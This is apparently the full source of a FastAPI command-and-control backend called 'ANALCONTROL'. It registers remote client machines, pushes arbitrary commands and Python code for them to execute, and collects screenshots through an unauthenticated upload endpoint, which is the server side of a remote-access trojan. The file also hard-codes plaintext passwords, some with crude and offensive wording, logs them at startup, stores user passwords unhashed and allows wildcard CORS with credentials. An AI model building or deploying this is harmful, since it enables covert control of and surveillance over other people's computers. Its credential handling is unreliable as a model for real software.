import os
import sys
import logging
import asyncio
import json
import uuid
import secrets
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Any

from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, Request, status, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.responses import JSONResponse, FileResponse
from pydantic import BaseModel, Field
import jwt
from supabase import create_client, Client
import subprocess
import tempfile
import base64

# ========== SINGLE INSTANCE PROTECTION (MUST BE FIRST) ==========
import tempfile as tmp
import ctypes
import time

def enforce_single_instance():
    """Prevent multiple instances from running"""
    lock_file = os.path.join(tmp.gettempdir(), 'analcontrol_backend.lock')
    
    if os.path.exists(lock_file):
        try:
            with open(lock_file, 'r') as f:
                pid = int(f.read().strip())
            # Check if process exists
            try:
                import psutil
                if psutil.pid_exists(pid):
                    sys.exit(0)
            except:
                pass
        except:
            pass
    
    # Create lock file
    try:
        with open(lock_file, 'w') as f:
            f.write(str(os.getpid()))
        
        # Cleanup on exit
        import atexit
        def cleanup_lock():
            try:
                if os.path.exists(lock_file):
                    os.remove(lock_file)
            except:
                pass
        atexit.register(cleanup_lock)
    except:
        pass

enforce_single_instance()

# ========== CONFIGURATION ==========
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))
PORT = int(os.getenv("PORT", "8000"))
SUPABASE_URL = os.getenv("SUPABASE_URL", "https://your-project.supabase.co")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "your-anon-key")
BACKEND_URL = os.getenv("BACKEND_URL", "https://dd-kpxl.onrender.com")

# ========== LOGGING SETUP ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('analcontrol.log')
    ]
)
logger = logging.getLogger(__name__)

# ========== SUPABASE CLIENT ==========
try:
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
    logger.info("✅ Supabase client initialized")
except Exception as e:
    logger.error(f"❌ Failed to initialize Supabase: {e}")
    supabase = None

# ========== FASTAPI APP ==========
app = FastAPI(
    title="ANALCONTROL API",
    version="3.0",
    description="Advanced Client Monitoring System",
    docs_url="/docs",
    redoc_url="/redoc"
)

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

security = HTTPBearer()

# ========== DATA MODELS ==========
class LoginRequest(BaseModel):
    email: str = Field(..., example="admin")
    password: str = Field(..., example="admin123")

class UserCreate(BaseModel):
    email: str = Field(..., example="newadmin")
    password: str = Field(..., example="password123")
    confirm_password: str = Field(..., example="password123")
    is_admin: bool = Field(default=True)

class UserUpdate(BaseModel):
    is_active: Optional[bool] = None
    is_admin: Optional[bool] = None
    theme: Optional[str] = None

class ClientRegister(BaseModel):
    client_id: str = Field(..., example="client-001")
    name: str = Field(..., example="Office Computer")
    ip_address: str = Field(..., example="192.168.1.100")
    os_info: str = Field(default="Unknown", example="Windows 11")
    hardware_info: Optional[Dict] = Field(default_factory=dict)

class CommandRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    command: str = Field(..., example="system_info")
    parameters: Dict[str, Any] = Field(default_factory=dict)

class PythonFileRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    filename: str = Field(..., example="script.py")
    content: str = Field(..., description="Python code content")
    parameters: Optional[List[str]] = Field(default_factory=list)

class ScreenshotRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    image_data: str = Field(..., description="Base64 encoded image")
    filename: str = Field(..., example="screenshot.png")

# ========== SECURITY FUNCTIONS ==========
def create_jwt_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(hours=24)
    
    to_encode.update({
        "exp": expire,
        "iat": datetime.utcnow(),
    })
    return jwt.encode(to_encode, JWT_SECRET_KEY, algorithm="HS256")

def verify_jwt_token(token: str) -> Optional[dict]:
    try:
        payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=["HS256"])
        return payload
    except:
        return None

async def authenticate_user(credentials: HTTPAuthorizationCredentials = Depends(security)) -> dict:
    if not credentials:
        raise HTTPException(status_code=401, detail="Missing authentication token")
    
    token = credentials.credentials
    payload = verify_jwt_token(token)
    
    if not payload:
        raise HTTPException(status_code=401, detail="Invalid or expired token")
    
    return payload

# ========== SUPABASE FUNCTIONS ==========
async def supabase_verify_user(email: str, password: str) -> Optional[dict]:
    """Verify user credentials using Supabase"""
    if not supabase:
        logger.error("Supabase not initialized")
        return None
    
    try:
        # Query users table
        response = supabase.table("users")\
            .select("*")\
            .eq("email", email)\
            .execute()
        
        if not response.data or len(response.data) == 0:
            return None
        
        user_data = response.data[0]
        
        # In production, use bcrypt to verify password
        # For now, we'll use direct comparison (replace with bcrypt)
        if user_data.get("password_hash") and user_data.get("password_hash") == password:
            # Update last login
            supabase.table("users")\
                .update({"last_login": datetime.utcnow().isoformat()})\
                .eq("id", user_data["id"])\
                .execute()
            
            return {
                "id": user_data["id"],
                "email": user_data["email"],
                "is_admin": user_data["is_admin"],
                "theme": user_data.get("theme", "cyberpunk"),
                "is_active": user_data.get("is_active", True)
            }
    
    except Exception as e:
        logger.error(f"Supabase auth error: {e}")
    
    return None

async def supabase_get_user_by_email(email: str) -> Optional[dict]:
    """Get user by email"""
    if not supabase:
        return None
    
    try:
        response = supabase.table("users")\
            .select("*")\
            .eq("email", email)\
            .execute()
        
        if response.data and len(response.data) > 0:
            return response.data[0]
    except Exception as e:
        logger.error(f"Supabase get user error: {e}")
    
    return None

async def supabase_create_user(user_data: dict) -> bool:
    """Create new user in Supabase"""
    if not supabase:
        return False
    
    try:
        # Check if user exists
        existing = await supabase_get_user_by_email(user_data["email"])
        if existing:
            return False
        
        # Create user (in production, hash the password)
        response = supabase.table("users").insert({
            "email": user_data["email"],
            "password_hash": user_data["password"],  # Hash this in production!
            "is_admin": user_data.get("is_admin", False),
            "theme": user_data.get("theme", "cyberpunk"),
            "is_active": True,
            "created_at": datetime.utcnow().isoformat()
        }).execute()
        
        return bool(response.data)
    except Exception as e:
        logger.error(f"Supabase create user error: {e}")
        return False

# ========== WEBSOCKET MANAGER ==========
class ConnectionManager:
    def __init__(self):
        self.client_connections: Dict[str, WebSocket] = {}
        self.admin_connections: List[WebSocket] = {}
    
    async def connect_admin(self, websocket: WebSocket, user_id: str):
        await websocket.accept()
        self.admin_connections[user_id] = websocket
        logger.info(f"👑 Admin connected: {user_id}")
    
    async def connect_client(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.client_connections[client_id] = websocket
        logger.info(f"🖥️ Client connected: {client_id}")
        
        # Update client status in database
        if supabase:
            try:
                supabase.table("clients")\
                    .update({
                        "ws_online": True,
                        "last_seen": datetime.utcnow().isoformat()
                    })\
                    .eq("client_id", client_id)\
                    .execute()
            except Exception as e:
                logger.error(f"Update client status error: {e}")
        
        # Notify all admins
        await self.notify_admins({
            "type": "client_connected",
            "client_id": client_id,
            "timestamp": datetime.utcnow().isoformat()
        })
    
    async def disconnect(self, websocket: WebSocket):
        # Check if admin
        admin_id = None
        for uid, ws in self.admin_connections.items():
            if ws == websocket:
                admin_id = uid
                break
        
        if admin_id:
            del self.admin_connections[admin_id]
            logger.info(f"👑 Admin disconnected: {admin_id}")
        
        # Check if client
        client_id = None
        for cid, ws in self.client_connections.items():
            if ws == websocket:
                client_id = cid
                break
        
        if client_id:
            del self.client_connections[client_id]
            logger.info(f"🖥️ Client disconnected: {client_id}")
            
            # Update client status
            if supabase:
                try:
                    supabase.table("clients")\
                        .update({"ws_online": False})\
                        .eq("client_id", client_id)\
                        .execute()
                except Exception as e:
                    logger.error(f"Update client offline error: {e}")
            
            # Notify admins
            await self.notify_admins({
                "type": "client_disconnected",
                "client_id": client_id,
                "timestamp": datetime.utcnow().isoformat()
            })
    
    async def send_to_client(self, client_id: str, message: dict) -> bool:
        if client_id in self.client_connections:
            try:
                await self.client_connections[client_id].send_json(message)
                return True
            except Exception as e:
                logger.error(f"Send to client error: {e}")
                return False
        return False
    
    async def notify_admins(self, message: dict):
        disconnected = []
        for user_id, connection in self.admin_connections.items():
            try:
                await connection.send_json(message)
            except:
                disconnected.append(user_id)
        
        for user_id in disconnected:
            if user_id in self.admin_connections:
                del self.admin_connections[user_id]

manager = ConnectionManager()

# ========== API ROUTES ==========
@app.post("/api/login", response_model=dict)
async def login(data: LoginRequest):
    """Login endpoint"""
    try:
        logger.info(f"Login attempt for: {data.email}")
        
        user_data = await supabase_verify_user(data.email, data.password)
        
        if not user_data:
            # Fallback for legacy users
            legacy_users = {
                "admin": {"password": "admin123", "is_admin": True, "theme": "cyberpunk"},
                "xotiic": {"password": "40671Mps19*", "is_admin": True, "theme": "cyberpunk"},
                "nathan": {"password": "femboy67", "is_admin": True, "theme": "femboy"},
                "kizer": {"password": "kidraper67", "is_admin": True, "theme": "cyberpunk"}
            }
            
            if data.email.lower() in legacy_users:
                user = legacy_users[data.email.lower()]
                if user["password"] == data.password:
                    user_data = {
                        "id": str(uuid.uuid4()),
                        "email": data.email,
                        "is_admin": user["is_admin"],
                        "theme": user["theme"],
                        "is_active": True
                    }
        
        if not user_data:
            raise HTTPException(status_code=401, detail="Invalid credentials")
        
        # Create JWT token
        token_data = {
            "sub": user_data["email"],
            "email": user_data["email"],
            "is_admin": user_data["is_admin"],
            "user_id": user_data["id"],
            "theme": user_data.get("theme", "cyberpunk")
        }
        
        token = create_jwt_token(token_data)
        
        return {
            "success": True,
            "token": token,
            "user": {
                "email": user_data["email"],
                "is_admin": user_data["is_admin"],
                "theme": user_data.get("theme", "cyberpunk"),
                "user_id": user_data["id"]
            }
        }
        
    except Exception as e:
        logger.error(f"Login error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/create-account", response_model=dict)
async def create_account(data: UserCreate, user: dict = Depends(authenticate_user)):
    """Create new user account"""
    try:
        if not user.get("is_admin"):
            raise HTTPException(status_code=403, detail="Admin access required")
        
        if data.password != data.confirm_password:
            raise HTTPException(status_code=400, detail="Passwords do not match")
        
        if len(data.password) < 6:
            raise HTTPException(status_code=400, detail="Password must be at least 6 characters")
        
        success = await supabase_create_user({
            "email": data.email,
            "password": data.password,  # Hash this in production!
            "is_admin": data.is_admin,
            "theme": "cyberpunk"
        })
        
        if not success:
            raise HTTPException(status_code=400, detail="Failed to create user")
        
        return {
            "success": True,
            "message": "User created successfully",
            "email": data.email
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Create account error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/users", response_model=dict)
async def get_users(user: dict = Depends(authenticate_user)):
    """Get all users"""
    try:
        if not user.get("is_admin"):
            raise HTTPException(status_code=403, detail="Admin access required")
        
        if not supabase:
            return {"success": True, "users": []}
        
        response = supabase.table("users")\
            .select("id, email, is_admin, theme, is_active, last_login, created_at")\
            .execute()
        
        return {
            "success": True,
            "users": response.data or []
        }
        
    except Exception as e:
        logger.error(f"Get users error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/register-client", response_model=dict)
async def register_client(data: ClientRegister, request: Request):
    """Register or update client"""
    try:
        # Get client IP
        if not data.ip_address or data.ip_address == "Unknown":
            client_ip = request.headers.get('X-Forwarded-For', request.client.host)
            if client_ip:
                data.ip_address = client_ip.split(',')[0].strip()
        
        if not supabase:
            return {
                "success": True,
                "message": "Client registered (no database)",
                "client_id": data.client_id
            }
        
        # Check if client exists
        response = supabase.table("clients")\
            .select("*")\
            .eq("client_id", data.client_id)\
            .execute()
        
        client_data = {
            "client_id": data.client_id,
            "name": data.name,
            "ip_address": data.ip_address,
            "os_info": data.os_info,
            "hardware_info": data.hardware_info or {},
            "online": True,
            "last_seen": datetime.utcnow().isoformat()
        }
        
        if response.data and len(response.data) > 0:
            # Update existing client
            supabase.table("clients")\
                .update(client_data)\
                .eq("client_id", data.client_id)\
                .execute()
            action = "updated"
        else:
            # Create new client
            client_data.update({
                "registered_at": datetime.utcnow().isoformat(),
                "created_at": datetime.utcnow().isoformat()
            })
            supabase.table("clients").insert(client_data).execute()
            action = "registered"
        
        # Add log
        supabase.table("logs").insert({
            "client_id": data.client_id,
            "log_type": "info",
            "message": f"Client {action}: {data.name}",
            "created_at": datetime.utcnow().isoformat()
        }).execute()
        
        return {
            "success": True,
            "message": f"Client {action} successfully",
            "client_id": data.client_id
        }
        
    except Exception as e:
        logger.error(f"Register client error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/clients", response_model=dict)
async def get_clients(
    user: dict = Depends(authenticate_user),
    online_only: bool = Query(False),
    search: Optional[str] = Query(None)
):
    """Get all clients"""
    try:
        if not supabase:
            return {"success": True, "clients": []}
        
        query = supabase.table("clients").select("*")
        
        if online_only:
            query = query.eq("online", True)
        
        if search:
            query = query.or_(f"name.ilike.%{search}%,client_id.ilike.%{search}%")
        
        response = query.order("last_seen", desc=True).execute()
        
        clients = response.data or []
        
        # Add WebSocket online status
        for client in clients:
            client["ws_online"] = client["client_id"] in manager.client_connections
        
        return {
            "success": True,
            "clients": clients
        }
        
    except Exception as e:
        logger.error(f"Get clients error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/command", response_model=dict)
async def send_command(data: CommandRequest, user: dict = Depends(authenticate_user)):
    """Send command to client"""
    try:
        # Check if client exists
        if supabase:
            client_response = supabase.table("clients")\
                .select("*")\
                .eq("client_id", data.client_id)\
                .execute()
            
            if not client_response.data:
                raise HTTPException(status_code=404, detail="Client not found")
        
        # Create command record
        command_id = str(uuid.uuid4())
        
        if supabase:
            supabase.table("commands").insert({
                "id": command_id,
                "client_id": data.client_id,
                "command": data.command,
                "parameters": data.parameters,
                "status": "pending",
                "user_email": user.get("email"),
                "created_at": datetime.utcnow().isoformat()
            }).execute()
        
        # Send via WebSocket
        sent = await manager.send_to_client(data.client_id, {
            "type": "command",
            "command_id": command_id,
            "command": data.command,
            "parameters": data.parameters,
            "from_user": user.get("email"),
            "timestamp": datetime.utcnow().isoformat()
        })
        
        if not sent:
            # Update status if WebSocket failed
            if supabase:
                supabase.table("commands")\
                    .update({"status": "failed", "error": "Client not connected"})\
                    .eq("id", command_id)\
                    .execute()
        
        return {
            "success": True,
            "command_id": command_id,
            "sent": sent,
            "client_id": data.client_id
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Send command error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/execute-python", response_model=dict)
async def execute_python_file(data: PythonFileRequest, user: dict = Depends(authenticate_user)):
    """Execute Python file on client"""
    try:
        # Create unique filename
        filename = f"script_{uuid.uuid4().hex[:8]}.py"
        
        # Send via WebSocket
        sent = await manager.send_to_client(data.client_id, {
            "type": "python_execute",
            "filename": filename,
            "content": data.content,
            "parameters": data.parameters or [],
            "from_user": user.get("email"),
            "timestamp": datetime.utcnow().isoformat()
        })
        
        if not sent:
            raise HTTPException(status_code=400, detail="Client not connected")
        
        return {
            "success": True,
            "message": "Python file sent for execution",
            "filename": filename,
            "client_id": data.client_id
        }
        
    except Exception as e:
        logger.error(f"Execute Python error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/screenshot", response_model=dict)
async def upload_screenshot(data: ScreenshotRequest):
    """Upload screenshot"""
    try:
        if not supabase:
            return {"success": True, "message": "Screenshot received"}
        
        # Decode base64 image
        try:
            image_data = base64.b64decode(data.image_data)
        except:
            raise HTTPException(status_code=400, detail="Invalid image data")
        
        # Store in database
        supabase.table("screenshots").insert({
            "client_id": data.client_id,
            "image_data": data.image_data,
            "filename": data.filename,
            "size": len(image_data),
            "created_at": datetime.utcnow().isoformat()
        }).execute()
        
        # Add log
        supabase.table("logs").insert({
            "client_id": data.client_id,
            "log_type": "info",
            "message": f"Screenshot captured: {data.filename}",
            "created_at": datetime.utcnow().isoformat()
        }).execute()
        
        return {
            "success": True,
            "message": "Screenshot uploaded",
            "filename": data.filename,
            "size": len(image_data)
        }
        
    except Exception as e:
        logger.error(f"Upload screenshot error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/commands", response_model=dict)
async def get_commands(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    limit: int = Query(50, ge=1, le=1000)
):
    """Get command history"""
    try:
        if not supabase:
            return {"success": True, "commands": []}
        
        query = supabase.table("commands").select("*")
        
        if client_id:
            query = query.eq("client_id", client_id)
        
        response = query.order("created_at", desc=True)\
                       .limit(limit)\
                       .execute()
        
        return {
            "success": True,
            "commands": response.data or []
        }
        
    except Exception as e:
        logger.error(f"Get commands error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/logs", response_model=dict)
async def get_logs(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    log_type: Optional[str] = Query(None),
    limit: int = Query(100, ge=1, le=1000)
):
    """Get system logs"""
    try:
        if not supabase:
            return {"success": True, "logs": []}
        
        query = supabase.table("logs").select("*")
        
        if client_id:
            query = query.eq("client_id", client_id)
        
        if log_type and log_type != "all":
            query = query.eq("log_type", log_type)
        
        response = query.order("created_at", desc=True)\
                       .limit(limit)\
                       .execute()
        
        return {
            "success": True,
            "logs": response.data or []
        }
        
    except Exception as e:
        logger.error(f"Get logs error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/stats", response_model=dict)
async def get_stats(user: dict = Depends(authenticate_user)):
    """Get system statistics"""
    try:
        stats = {
            "total_clients": 0,
            "online_clients": 0,
            "ws_online_clients": 0,
            "pending_commands": 0,
            "total_commands": 0,
            "today_logs": 0,
            "total_screenshots": 0
        }
        
        if supabase:
            # Get counts from database
            clients_resp = supabase.table("clients").select("count").execute()
            online_resp = supabase.table("clients").select("count").eq("online", True).execute()
            commands_resp = supabase.table("commands").select("count").execute()
            pending_resp = supabase.table("commands").select("count").eq("status", "pending").execute()
            
            today = datetime.utcnow().date().isoformat()
            logs_resp = supabase.table("logs")\
                .select("count")\
                .gte("created_at", f"{today}T00:00:00")\
                .execute()
            
            screenshots_resp = supabase.table("screenshots").select("count").execute()
            
            stats = {
                "total_clients": clients_resp.data[0]["count"] if clients_resp.data else 0,
                "online_clients": online_resp.data[0]["count"] if online_resp.data else 0,
                "ws_online_clients": len(manager.client_connections),
                "pending_commands": pending_resp.data[0]["count"] if pending_resp.data else 0,
                "total_commands": commands_resp.data[0]["count"] if commands_resp.data else 0,
                "today_logs": logs_resp.data[0]["count"] if logs_resp.data else 0,
                "total_screenshots": screenshots_resp.data[0]["count"] if screenshots_resp.data else 0
            }
        
        return {
            "success": True,
            "stats": stats
        }
        
    except Exception as e:
        logger.error(f"Get stats error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

# ========== WEBSOCKET ENDPOINTS ==========
@app.websocket("/ws/admin/{user_id}")
async def websocket_admin(websocket: WebSocket, user_id: str):
    await manager.connect_admin(websocket, user_id)
    
    try:
        while True:
            try:
                data = await websocket.receive_json()
                
                # Handle ping
                if data.get("type") == "ping":
                    await websocket.send_json({
                        "type": "pong",
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
            except WebSocketDisconnect:
                break
            except Exception as e:
                logger.error(f"Admin WebSocket error: {e}")
                continue
                
    except WebSocketDisconnect:
        await manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Admin WebSocket fatal error: {e}")
        await manager.disconnect(websocket)

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await manager.connect_client(websocket, client_id)
    
    try:
        while True:
            try:
                data = await websocket.receive_json()
                
                if data.get("type") == "heartbeat":
                    # Update client status
                    if supabase:
                        supabase.table("clients")\
                            .update({
                                "last_seen": datetime.utcnow().isoformat(),
                                "online": True
                            })\
                            .eq("client_id", client_id)\
                            .execute()
                    
                    # Send response
                    await websocket.send_json({
                        "type": "heartbeat_response",
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
                elif data.get("type") == "command_result":
                    # Update command status
                    if supabase:
                        supabase.table("commands")\
                            .update({
                                "status": "completed",
                                "result": data.get("result"),
                                "error": data.get("error"),
                                "completed_at": datetime.utcnow().isoformat()
                            })\
                            .eq("id", data.get("command_id"))\
                            .execute()
                    
                    # Notify admins
                    await manager.notify_admins({
                        "type": "command_result",
                        "client_id": client_id,
                        "command_id": data.get("command_id"),
                        "command": data.get("command"),
                        "result": data.get("result"),
                        "error": data.get("error"),
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
                elif data.get("type") == "log":
                    # Store log
                    if supabase:
                        supabase.table("logs").insert({
                            "client_id": client_id,
                            "log_type": data.get("log_type", "info"),
                            "message": data.get("message", ""),
                            "created_at": datetime.utcnow().isoformat()
                        }).execute()
                    
                    # Notify admins
                    await manager.notify_admins({
                        "type": "client_log",
                        "client_id": client_id,
                        "log_type": data.get("log_type", "info"),
                        "message": data.get("message", ""),
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
                elif data.get("type") == "python_result":
                    # Store Python execution result
                    if supabase:
                        supabase.table("logs").insert({
                            "client_id": client_id,
                            "log_type": "info",
                            "message": f"Python execution: {data.get('result', '')}",
                            "created_at": datetime.utcnow().isoformat()
                        }).execute()
                    
                    # Notify admins
                    await manager.notify_admins({
                        "type": "python_result",
                        "client_id": client_id,
                        "filename": data.get("filename"),
                        "result": data.get("result"),
                        "error": data.get("error"),
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
            except WebSocketDisconnect:
                break
            except Exception as e:
                logger.error(f"Client WebSocket error: {e}")
                continue
                
    except WebSocketDisconnect:
        await manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Client WebSocket fatal error: {e}")
        await manager.disconnect(websocket)

# ========== HEALTH CHECK ==========
@app.get("/api/health", response_model=dict)
async def health_check():
    return {
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat(),
        "version": "3.0",
        "supabase_connected": supabase is not None,
        "active_clients": len(manager.client_connections),
        "active_admins": len(manager.admin_connections)
    }

@app.get("/api/user/theme", response_model=dict)
async def get_user_theme(user: dict = Depends(authenticate_user)):
    return {
        "success": True,
        "theme": user.get("theme", "cyberpunk"),
        "username": user.get("email")
    }

# ========== SERVE FRONTEND ==========
@app.get("/")
async def serve_frontend():
    """Serve the frontend"""
    return FileResponse("frontend.html")

# ========== STARTUP ==========
@app.on_event("startup")
async def startup_event():
    logger.info("=" * 50)
    logger.info("🚀 ANALCONTROL API v3.0 Starting...")
    logger.info(f"📡 Port: {PORT}")
    logger.info(f"🔗 Supabase: {'Connected' if supabase else 'Not Connected'}")
    logger.info(f"🌐 Backend URL: {BACKEND_URL}")
    logger.info("=" * 50)
    logger.info("👤 Default Users:")
    logger.info("  • admin/admin123 (cyberpunk theme)")
    logger.info("  • xotiic/40671Mps19* (cyberpunk theme)")
    logger.info("  • nathan/femboy67 (femboy theme)")
    logger.info("  • kizer/kidraper67 (cyberpunk theme)")
    logger.info("=" * 50)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=PORT,
        log_level="info",
        access_log=True
    )
